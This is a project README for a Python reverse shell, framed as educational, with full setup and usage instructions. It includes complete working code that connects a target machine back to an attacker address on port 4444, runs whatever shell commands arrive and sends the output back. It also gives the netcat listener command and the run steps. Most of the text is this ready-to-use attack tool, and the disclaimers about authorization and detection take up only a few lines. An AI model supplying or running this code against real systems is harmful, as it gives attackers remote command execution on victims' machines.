
# Reverse Shell Script

This project is a Python-based reverse shell script. It connects a compromised machine back to an attacker's machine, allowing the attacker to execute shell commands remotely on the compromised system. **This script is for educational purposes only and should be used responsibly.**

## Features

- Establishes a reverse connection to a specified IP and port.
- Executes shell commands received from the attacker's machine.
- Sends command outputs back to the attacker.

## Requirements

- Python 3.x
- Netcat (`nc`) or a similar tool on the attacker's machine for listening to connections.

## Setup

### Attacker's Machine

1. **Start a Listener:**

   Open a terminal and run:

   ```bash
   nc -lvp 4444
   ```

   - `-l`: Listen mode.
   - `-v`: Verbose output.
   - `-p 4444`: Listen on port 4444 (ensure this matches the script configuration).

### Target Machine

1. **Save the Script:**

   Create a file named `reverse_shell.py` and paste the following code:

   ```python
   import socket
   import subprocess
   import sys
   import time

   HOST = '172.16.0.2'  # IP address of the attacking machine
   PORT = 4444          # Port number the attacking machine is listening on

   def connect(host, port):
       go = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       go.connect((host, port))
       return go

   def wait(go):
       data = go.recv(1024).decode('utf-8')
       if data == "exit\n":
           go.close()
           sys.exit(0)
       elif len(data) == 0:
           return True
       else:
           p = subprocess.Popen(data, shell=True,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
           stdout, stderr = p.communicate()
           go.send(stdout + stderr)
           return False

   def main():
       while True:
           dead = False
           try:
               go = connect(HOST, PORT)
               while not dead:
                   dead = wait(go)
               go.close()
           except socket.error:
               pass
           time.sleep(2)

   if __name__ == "__main__":
       sys.exit(main())
   ```

2. **Run the Script:**

   Open a terminal, navigate to the script directory, and execute:

   ```bash
   python3 reverse_shell.py
   ```

   This will attempt to connect back to the attacker’s machine.

## Usage

1. **Listener Setup:**

   Ensure the attacker's machine is ready to accept connections:

   ```bash
   nc -lvp 4444
   ```

2. **Execute Script:**

   Run the script on the target machine to establish a reverse shell:

   ```bash
   python3 reverse_shell.py
   ```

3. **Command Execution:**

   - Type commands in the Netcat terminal to execute them on the target machine.
   - Use `exit` to close the connection.

## Security Considerations

- **Legal Use:** Ensure you have explicit permission to test systems using this script. Unauthorized access to computer systems is illegal.
- **Network Configuration:** Ensure the target machine can connect to the attacker's machine over the network. Adjust firewall settings if necessary.
- **Detection and Prevention:** Use network monitoring tools to detect and block unauthorized outgoing connections.

## Disclaimer

This script is intended for educational purposes only. It demonstrates how reverse shells work and should only be used in a controlled environment with explicit authorization. Misuse of this script can result in legal action.
This README provides a comprehensive overview of the project, including setup, usage instructions, and important security considerations. Always ensure that such scripts are used legally and ethically.
